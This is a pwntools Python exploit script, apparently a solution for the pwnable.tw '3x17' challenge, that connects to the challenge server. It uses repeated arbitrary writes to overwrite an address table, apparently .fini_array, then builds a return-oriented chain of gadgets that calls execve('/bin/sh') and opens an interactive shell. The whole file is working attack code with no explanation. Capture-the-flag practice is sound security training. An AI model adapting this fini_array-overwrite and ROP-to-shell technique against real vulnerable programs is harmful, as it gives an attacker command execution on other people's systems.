#!/bin/python3

from pwn import *

context.arch = 'amd64'
p = remote('chall.pwnable.tw', 10105)
# p = process('./3x17') - temporary
e = ELF('./3x17')
r = ROP(e)

# Just finding gadgets

syscall_ret = r.find_gadget(["syscall", "ret"])[0]
pop_rax_ret = r.find_gadget(["pop rax", "ret"])[0]
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_ret = r.find_gadget(["pop rsi", "ret"])[0]
pop_rdx_ret = r.find_gadget(["pop rdx", "ret"])[0]
leave_ret   = r.find_gadget(["leave", "ret"])[0]


# Construct rop chain - execve("/bin/sh", 0, 0)

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x00).encode())
p.sendafter(b'data:', p64(0x402960) + p64(0x401b6d))

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x10).encode())
p.sendafter(b'data:', p64(pop_rax_ret) + p64(0x3b))

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x20).encode())
p.sendafter(b'data:', p64(pop_rsi_ret) + p64(0x00))

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x30).encode())
p.sendafter(b'data:', p64(pop_rdx_ret) + p64(0x00))

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x40).encode())
p.sendafter(b'data:', p64(pop_rdi_ret) + p64(0x4b40f0 + 0x58)) # -- return to this later

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x50).encode())
p.sendafter(b'data:', p64(syscall_ret)) 

p.sendlineafter(b'addr:', str(0x4b40f0 + 0x58).encode())
p.sendafter(b'data:', b'/bin/sh\x00') 

p.sendlineafter(b'addr:', str(0x4b40f0).encode())
p.sendafter(b'data:', p64(leave_ret)) 


# Should have a shell at this point, you know what's good lmao

p.interactive()

